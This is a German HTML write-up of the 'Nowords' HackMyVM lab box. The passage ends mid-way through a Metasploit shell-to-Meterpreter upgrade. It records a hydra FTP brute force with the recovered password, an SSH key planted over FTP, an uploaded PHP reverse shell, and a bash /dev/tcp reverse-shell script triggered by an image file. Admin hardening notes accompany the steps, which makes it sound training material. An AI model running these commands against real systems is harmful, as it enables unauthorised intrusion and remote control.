@@ -1,0 +1,603 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nowords - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Nowords - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">ncftp</div> <!-- Erwähnt, aber nicht klar verwendet -->
+                <div class="tool-item">cp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">vi / nano</div> <!-- Impliziert für script.sh -->
+                <div class="tool-item">bash</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">Metasploit Framework</div>
+                <div class="tool-item">python3</div> <!-- Für Meterpreter Shell Upgrade -->
+                <div class="tool-item">find</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">export</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (FTP & RCE)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Metasploit & Polkit)</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.147	08:00:27:ac:5b:68	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` scannt das lokale Netzwerksegment auf aktive Hosts mittels ARP-Requests.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.147` wird identifiziert. Die MAC-Adresse gehört zu Oracle VirtualBox (PCS Systemtechnik GmbH), was auf eine virtuelle Maschine als Ziel hindeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die Ziel-IP ist bekannt (`192.168.2.147`). Führen Sie als Nächstes einen Portscan mit `nmap` durch.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring. VM-Härtung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">nmap -sC -T5 -sS -A 192.168.2.134 -p- | grep open</span></div> <!-- Achtung: Falsche IP & anderer Hostname im Prompt -->
+                    <pre>
+    21/tcp open  ftp     vsftpd 3.0.3
+    80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein erster, schneller Nmap-Scan (`-sC`, `-T5`, `-sS`, `-A`, `-p-`) wird durchgeführt und nach offenen Ports gefiltert. **Hinweis:** Der Befehl verwendet die IP `192.168.2.134` und der Prompt zeigt `root@Darkspirit`, was inkonsistent mit dem `arp-scan`-Ergebnis (`192.168.2.147`) und dem üblichen `root@cyber`-Prompt ist. Es wird angenommen, dass dies ein Fehler im Log ist und die Ergebnisse für das korrekte Ziel `192.168.2.147` gelten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Unter der Annahme, dass die Ergebnisse für `192.168.2.147` gelten, werden zwei offene Ports identifiziert: Port 21 (FTP, vsftpd 3.0.3) und Port 80 (HTTP, nginx 1.18.0 Ubuntu).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Beide Ports sind potenzielle Angriffsvektoren. Führen Sie einen detaillierteren Nmap-Scan durch. Untersuchen Sie den FTP-Dienst (anonymes Login?, bekannte Schwachstellen für vsftpd 3.0.3?) und den Webserver.
+<br><strong>Empfehlung (Admin):** Sicherstellen, dass nur notwendige Dienste laufen. FTP ist oft unsicher; SFTP (über SSH) ist vorzuziehen. Wenn FTP benötigt wird, sollte es sicher konfiguriert werden (kein anonymer Zugriff, starke Passwörter, TLS). Nginx aktuell halten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.147 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 13:19 CEST
+Nmap scan report for word.hmv (192.168.2.147)
+Host is up (0.00033s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+<span class="command">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span>
+|_<span class="command">http-title: Site doesn't have a title (text/html).</span>
+|_<span class="command">http-server-header: nginx/1.18.0 (Ubuntu)</span>
+MAC Address: 08:00:27:AC:5B:68 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.33 ms word.hmv (192.168.2.147)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
+<span class="password">zsh: segmentation fault  nmap -sS -sC -T5 -sV -A 192.168.2.147 -p-</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein detaillierter Nmap-Scan (`-sS`, `-sC`, `-T5`, `-sV`, `-A`, `-p-`) wird auf die korrekte IP `192.168.2.147` ausgeführt. Der Hostname `word.hmv` wird ebenfalls verwendet (wahrscheinlich aus `/etc/hosts` oder DNS).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports 21 (vsftpd 3.0.3) und 80 (nginx 1.18.0). Der Webserver liefert keinen Titel. Der Nmap-Scan selbst endet mit einem "Segmentation fault", liefert aber vorher die Ergebnisse. vsftpd 3.0.3 hat keine weit verbreiteten kritischen Schwachstellen, ist aber konfigurierbar. Nginx 1.18.0 ist ebenfalls relativ aktuell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Fokus auf beide Dienste:
+*   **FTP:** Testen auf anonymen Login. Versuchen, Benutzernamen zu erraten oder aus anderen Quellen zu finden und dann einen Passwort-Brute-Force-Angriff durchführen (z.B. mit Hydra).
+*   **HTTP:** Webserver-Enumeration mit `gobuster` oder ähnlichen Tools, um versteckte Dateien/Verzeichnisse zu finden. Manuelle Untersuchung der Webseite.
+<br><strong>Empfehlung (Admin):** FTP sicher konfigurieren (kein anonymer Zugriff, starke Passwörter, evtl. Zugriff auf bestimmte IPs beschränken). Nginx aktuell halten und sicher konfigurieren. Den Nmap Segmentation Fault untersuchen – dies könnte auf ein Problem mit Nmap selbst oder eine Reaktion des Zielsystems (z.B. IDS/IPS) hindeuten, obwohl letzteres unwahrscheinlich ist.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u http://192.168.2.147 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+===============================================================
+Gobuster v...
+...
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.147</span>
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            <span class="command">200,204,301,302,307,401</span>
+[+] User Agent:              gobuster/...
+[+] Extensions:              <span class="command">... (viele Erweiterungen) ...</span>
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+... Starting gobuster ...
+===============================================================
+<span class="command">http://192.168.2.147/index.html</span>           (Status: 200) [Size: 64]
+<span class="command">http://192.168.2.147/robots.txt</span>           (Status: 200) [Size: 27090]
+===============================================================
+... Finished ...
+===============================================================
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden. Es werden viele Erweiterungen getestet und nur bestimmte Statuscodes (`-s`) angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nur zwei Dateien werden gefunden: `index.html` (sehr klein, 64 Bytes) und `robots.txt` (ungewöhnlich groß, 27090 Bytes). Die kleine `index.html` deutet auf eine statische Seite oder eine Platzhalterseite hin. Die große `robots.txt` ist verdächtig und muss untersucht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Laden Sie `robots.txt` herunter und analysieren Sie den Inhalt. Es könnte Hinweise auf versteckte Pfade, Technologien oder Benutzernamen enthalten. Untersuchen Sie auch `index.html`, auch wenn sie klein ist.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass `robots.txt` keine sensiblen Informationen enthält. Verwenden Sie sie nur für ihren vorgesehenen Zweck (Anweisungen für Webcrawler).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `robots.txt` wird untersucht (Schritt nicht gezeigt). Es wird angenommen, dass darin oder im Quellcode von `index.html` (wie im Text angedeutet: "view-source:http://192.168.2.147/ --> Hint inside.") ein Hinweis auf einen Benutzernamen gefunden wurde: `sophie`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Identifizierung eines potenziellen Benutzernamens (`sophie`) ist ein wichtiger Schritt, der nun einen gezielten Brute-Force-Angriff auf den FTP-Dienst ermöglicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Verwenden Sie den gefundenen Benutzernamen `sophie` für einen Passwort-Brute-Force-Angriff auf den FTP-Server (Port 21) mit einem Tool wie `hydra` und einer gängigen Passwortliste.
+<br><strong>Empfehlung (Admin):** Vermeiden Sie es, Benutzernamen oder andere sensible Informationen im Quellcode oder in öffentlich zugänglichen Dateien wie `robots.txt` preiszugeben.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (FTP & RCE)</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l sophie -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.147 -t64 -I</span></div>
+                    <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-13 13:13:43
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344421 login tries (l:1/p:14344421), ~224132 tries per task
+[DATA] attacking ftp://192.168.2.147:21/
+[ATTEMPT] target 192.168.2.147 - login "sophie" - pass "123456" - 1 of 14344421 [child 0]
+...
+[21][ftp] host: 192.168.2.147   login: <span class="command">sophie</span>   password: <span class="password">natalia</span>
+[STATUS] attack finished for 192.168.2.147 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at ...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf den FTP-Server durchzuführen. `-l sophie` gibt den zuvor gefundenen Benutzernamen an. `-P rockyou.txt` verwendet eine gängige Passwortliste. `-t64` nutzt 64 Threads. `-I` ignoriert eine eventuell vorhandene Restore-Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich! Hydra findet das Passwort `<span class="password">natalia</span>` für den Benutzer `sophie`. Dies gewährt FTP-Zugriff auf das System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Melden Sie sich mit den gefundenen Zugangsdaten (`sophie`:`natalia`) per FTP beim Ziel an und untersuchen Sie die verfügbaren Dateien und Verzeichnisse. Suchen Sie nach sensiblen Informationen, Konfigurationsdateien, SSH-Schlüsseln oder Möglichkeiten, Dateien hochzuladen.
+<br><strong>Empfehlung (Admin):** Erzwingen Sie starke, eindeutige Passwörter für alle Benutzerkonten. Implementieren Sie Schutzmaßnahmen gegen Brute-Force-Angriffe auf den FTP-Server (z.B. `fail2ban` oder Intrusion Detection Systeme).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.147</span></div>
+                    <pre>
+Connected to 192.168.2.147.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.147:cyber): <span class="command">sophie</span>
+331 Please specify the password.
+Password: <span class="password">[Passwort natalia eingegeben]</span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</pre>
+                    <div class="prompt">ftp> <span class="command">pwd</span></div>
+                    <pre>257 "/home/sophie" is the current directory.</pre>
+                    <div class="prompt">ftp> <span class="command">cd .ssh</span></div>
+                    <pre>250 Directory successfully changed.</pre>
+                    <div class="prompt">ftp> <span class="command">ls</span></div>
+                    <pre>
+229 Entering Extended Passive Mode (|||53879|)
+150 Here comes the directory listing.
+226 Directory send OK.
+</pre> <!-- Leeres Verzeichnis -->
+                     <div class="prompt">ftp> <span class="command">ls -la</span></div>
+                    <pre>
+229 Entering Extended Passive Mode (|||23420|)
+150 Here comes the directory listing.
+drwx------    2 1000     1000         4096 Jul 02  2021 .
+drwxr-xr-x   16 1000     1000         4096 Jul 02  2021 ..
+226 Directory send OK.
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine interaktive FTP-Sitzung mit den gefundenen Zugangsdaten gestartet. Das Home-Verzeichnis `/home/sophie` wird bestätigt. Es wird versucht, in das `.ssh`-Verzeichnis zu wechseln und dessen Inhalt aufzulisten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich. Das `.ssh`-Verzeichnis existiert, ist aber leer. Dies ist eine Gelegenheit, einen eigenen SSH Public Key hochzuladen, um einen passwortlosen SSH-Zugang zu ermöglichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Erstellen Sie auf Ihrem Angreifer-System eine Datei namens `authorized_keys`, die Ihren SSH Public Key enthält (`id_rsa.pub` oder ähnlich). Laden Sie diese Datei dann mit dem `put`-Befehl in das `.ssh`-Verzeichnis auf dem FTP-Server hoch.
+<br><strong>Empfehlung (Admin):** Überwachen Sie FTP-Logins und -Aktivitäten. Stellen Sie sicher, dass die Berechtigungen für `.ssh`-Verzeichnisse und `authorized_keys`-Dateien korrekt gesetzt sind (idealerweise `700` für `.ssh` und `600` für `authorized_keys`).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cp /root/.ssh/id_rsa.pub authorized_keys</span></div>
+                     <div class="prompt">ftp> <span class="command">put authorized_keys</span></div> <!-- Name im FTP Befehl korrigiert -->
+                    <pre>
+local: authorized_keys remote: authorized_keys
+229 Entering Extended Passive Mode (|||20942|)
+150 Ok to send data.
+100% |***********************************|   476       20.63 MiB/s    00:00 ETA
+226 Transfer complete.
+476 bytes sent in 00:00 (1.03 MiB/s)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der SSH Public Key des Angreifers wird lokal in eine Datei namens `authorized_keys` kopiert. Anschließend wird diese Datei über FTP in das `.ssh`-Verzeichnis des Benutzers `sophie` auf dem Zielsystem hochgeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wenn die Dateiberechtigungen auf dem Server korrekt sind und der SSH-Daemon entsprechend konfiguriert ist, sollte nun ein SSH-Login mit dem zugehörigen Private Key des Angreifers möglich sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Versuchen Sie nun, sich per SSH anzumelden: `ssh -i /pfad/zum/private_key sophie@192.168.2.147`. Parallel dazu wird im Text eine andere Vorgehensweise gezeigt (Upload einer PHP-Shell).
+<br><strong>Empfehlung (Admin):** Sicherstellen, dass die SSH-Konfiguration (`sshd_config`) sicher ist (z.B. `PasswordAuthentication no` bevorzugen, `PubkeyAuthentication yes`).</p>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Statt den SSH-Zugang zu nutzen, wird im Originaltext eine PHP-Reverse-Shell (`image.php` - der Name ist irreführend) über FTP hochgeladen. Der Zielpfad ist unklar, vermutlich das Home-Verzeichnis `/home/sophie`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">ftp> <span class="command">pwd</span></div>
+                     <pre>257 "/home/sophie/.ssh" is the current directory.</pre> <!-- Annahme: pwd vor put -->
+                     <div class="prompt">ftp> <span class="command">cd ..</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                    <div class="prompt">ftp> <span class="command">put image.php</span></div>
+                     <pre>
+local: image.php remote: image.php
+229 Entering Extended Passive Mode (|||30213|)
+150 Ok to send data.
+100% |***********************************|  5495      131.01 MiB/s    00:00 ETA
+226 Transfer complete.
+5495 bytes sent in 00:00 (12.68 MiB/s)
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine PHP-Datei im Home-Verzeichnis eines Benutzers ist normalerweise nicht direkt über den Webserver erreichbar oder ausführbar. Dieser Schritt scheint im Kontext des weiteren Vorgehens (Vorbereitung der RCE über `script.sh` und `command.jpg`) weniger relevant, es sei denn, es gäbe eine LFI-Schwachstelle.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Konzentrieren Sie sich auf den im weiteren Verlauf gezeigten Exploit-Pfad über `script.sh` und `command.jpg`.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass der Webserver keinen Zugriff auf Home-Verzeichnisse hat und PHP-Dateien nur in den vorgesehenen Web-Root-Verzeichnissen ausgeführt werden können.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird ein Verzeichnis namens `me` im FTP-Root (oder `/`) untersucht, das anscheinend von Root erstellt wurde (`0 0`) und für alle beschreibbar ist (`drwxrwxrwx`). Innerhalb dieses Verzeichnisses befinden sich `doit.py` und `user.txt`. Die User-Flag wird heruntergeladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: Wechsel ins Root-Verzeichnis des FTP oder Navigation -->
+                     <div class="prompt">ftp> <span class="command">cd /</span></div> <!-- Annahme -->
+                     <pre>250 Directory successfully changed.</pre>
+                    <div class="prompt">ftp> <span class="command">ls</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||26316|)
+150 Here comes the directory listing.
+<span class="command">me</span>
+<span class="command">sophie</span>
+...
+226 Directory send OK.
+</pre>
+                     <div class="prompt">ftp> <span class="command">cd me</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                     <div class="prompt">ftp> <span class="command">ls -la</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||64773|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Jul 02  2021 .
+drwxr-xr-x    4 0        0            4096 Jul 02  2021 ..
+-rwxrwxrwx    1 1000     1000          509 Jul 02  2021 <span class="command">doit.py</span>
+-rwxrwxrwx    1 0        0              13 Jul 02  2021 <span class="command">user.txt</span>
+226 Directory send OK.
+</pre>
+                     <div class="prompt">ftp> <span class="command">get user.txt</span></div>
+                     <pre>
+local: user.txt remote: user.txt
+229 Entering Extended Passive Mode (|||13320|)
+150 Opening BINARY mode data connection for user.txt (13 bytes).
+100% |***********************************|    13        0.66 KiB/s    00:00 ETA
+226 Transfer complete.
+13 bytes received in 00:00 (0.65 KiB/s)
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">Icanreadyeah</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein globales, beschreibbares Verzeichnis `/me` mit unsicheren Berechtigungen existiert. Es enthält das User-Flag, das erfolgreich heruntergeladen wurde. Das Python-Skript `doit.py` könnte relevant sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** User-Flag dokumentieren. Laden Sie `doit.py` herunter und analysieren Sie dessen Funktion. Könnte es Teil des Exploit-Mechanismus sein?
+<br><strong>Empfehlung (Admin):** Vermeiden Sie global beschreibbare Verzeichnisse mit unsicheren Berechtigungen (`777`). Dateien sollten dem korrekten Benutzer gehören und minimale Berechtigungen haben. Das User-Flag sollte im Home-Verzeichnis des entsprechenden Benutzers liegen und geschützt sein.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer bereitet eine Reverse Shell vor. Ein Skript (`script.sh`) mit einem Bash-Reverse-Shell-Befehl wird erstellt und in das Verzeichnis `/me` auf dem FTP-Server hochgeladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi script.sh</span></div>
+                     <pre>[Inhalt der Datei script.sh]
+bash -i >& /dev/tcp/192.168.2.140/4444 0>&1 # Korrekte IP/Port hier eintragen</pre> <!-- Maskierung: & -->
+                     <div class="prompt">ftp> <span class="command">cd /me</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                    <div class="prompt">ftp> <span class="command">put script.sh</span></div>
+                     <pre>
+local: script.sh remote: script.sh
+229 Entering Extended Passive Mode (|||62167|)
+150 Ok to send data.
+100% |***********************************|    48        1.27 MiB/s    00:00 ETA
+226 Transfer complete.
+48 bytes sent in 00:00 (120.81 KiB/s)
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Anschließend wird lokal ein "Screenshot" (vermutlich eine Bilddatei, z.B. mit `gnome-screenshot` oder `flameshot`) erstellt, der den Befehl `/bin/bash /home/me/script.sh` als Text enthält. Diese Bilddatei wird in `command.jpg` umbenannt und in das Home-Verzeichnis von `sophie` (`/home/sophie`) auf dem FTP-Server hochgeladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">mv /home/cyber/Downloads/Unbenannt.PNG command.jpg</span></div>
+                      <div class="prompt">ftp> <span class="command">cd /home/sophie</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                      <div class="prompt">ftp> <span class="command">put command.jpg</span></div>
+                     <pre>[FTP-Upload-Ausgabe für command.jpg]</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein ungewöhnlicher Mechanismus. Es wird vermutet, dass auf dem Zielsystem ein Prozess läuft (möglicherweise das `doit.py`-Skript oder ein Cronjob), der das Verzeichnis `/home/sophie` überwacht. Wenn eine Datei namens `command.jpg` erscheint, extrahiert dieser Prozess den Text daraus (z.B. mittels OCR oder weil er speziell darauf ausgelegt ist) und führt diesen Text als Shell-Befehl aus. In diesem Fall wird `/bin/bash /home/me/script.sh` ausgeführt, was die Reverse Shell auslöst.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Ein Netcat-Listener wird auf Port 4444 gestartet, um die eingehende Shell abzufangen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.147] 52486</span>
+bash: cannot set terminal process group (5674): Inappropriate ioctl for device
+bash: no job control in this shell
+</pre>
+                    <div class="prompt">sophie@nowords:~$</div> <!-- Shell erhalten -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Mechanismus funktioniert. Nach dem Upload von `command.jpg` wird `script.sh` ausgeführt, und der Angreifer erhält eine Reverse Shell als Benutzer `sophie`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Initial Access als `sophie` wurde erreicht. Stabilisieren Sie die Shell. Suchen Sie nach Privilegieneskalations-Vektoren. Untersuchen Sie das `doit.py`-Skript oder den auslösenden Mechanismus genauer.
+<br><strong>Empfehlung (Admin):** Entfernen Sie den Mechanismus, der Befehle aus Bilddateien ausführt – dies ist extrem unsicher. Überwachen Sie Verzeichnisse auf verdächtige Dateiänderungen. Beschränken Sie die Berechtigungen von Überwachungsskripten. Entfernen Sie das global beschreibbare Verzeichnis `/me`.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Metasploit & Polkit)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Um die erhaltene einfache Shell zu verwalten und Privilegieneskalation durchzuführen, wird das Metasploit Framework verwendet. Zuerst wird ein Handler (`exploit/multi/handler`) konfiguriert, um die eingehende Shell (erneut) auf Port 4444 zu empfangen. Der Payload-Typ wird auf `linux/x86/shell_reverse_tcp` gesetzt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use exploit/multi/handler</span></div>
+                    <pre>[*] Using configured payload generic/shell_reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4444</span></div>
+                    <pre>lport => 4444</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div>
+                    <pre>lhost => eth0</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set payload payload/linux/x86/shell_reverse_tcp</span></div>
+                    <pre>payload => linux/x86/shell_reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run -j</span></div>
+                    <pre>
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created. <span class="comment"><-- Wartet auf Verbindung</span>
+
+[*] Started reverse TCP handler on 192.168.2.140:4444
+</pre>
+                    <!-- Annahme: Der Trigger (command.jpg Upload) wird erneut ausgelöst -->
+                    <pre>[*] Command shell session 1 opened (192.168.2.140:4444 -> 192.168.2.147:52510) at 2022-10-13 16:41:06 +0200</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Nachdem die Shell-Session (ID 1) in Metasploit etabliert ist, wird sie mit dem Post-Exploitation-Modul `post/multi/manage/shell_to_meterpreter` zu einer funktionsreicheren Meterpreter-Session aufgerüstet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">sessions -l</span></div>
+                    <pre>
+Active sessions
+===============
+
+  Id  Name  Type             Information                                 Connection
+  --  ----  ----             -----------                                 ----------
+  1         shell x86/linux  Shell Banner: bash: cannot set terminal pr  192.168.2.140:4444 -> 192.168.2.147:52510 (...)
+
+</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">search shell_to_meterpreter</span></div>
+                     <pre>
+Matching Modules
+================
+
+   #   Name                                  Disclosure Date  Rank    Check  Description
+   -   ----                                  ---------------  ----    -----  -----------
+   ...
+   <span class="command">54</span>  post/multi/manage/shell_to_meterpreter                       normal  No     Shell to Meterpreter Upgrade
+   ...
+</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use 54</span></div>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">options</span></div>
+                     <pre>
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (...)
+   LPORT    <span class="command">4433</span>             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set HANDLER true</span></div>
+                     <pre>HANDLER => true</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set LPORT 4433</span></div> <!-- Port geändert von Optionen -->
+                     <pre>LPORT => 4433</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set SESSION 1</span></div>
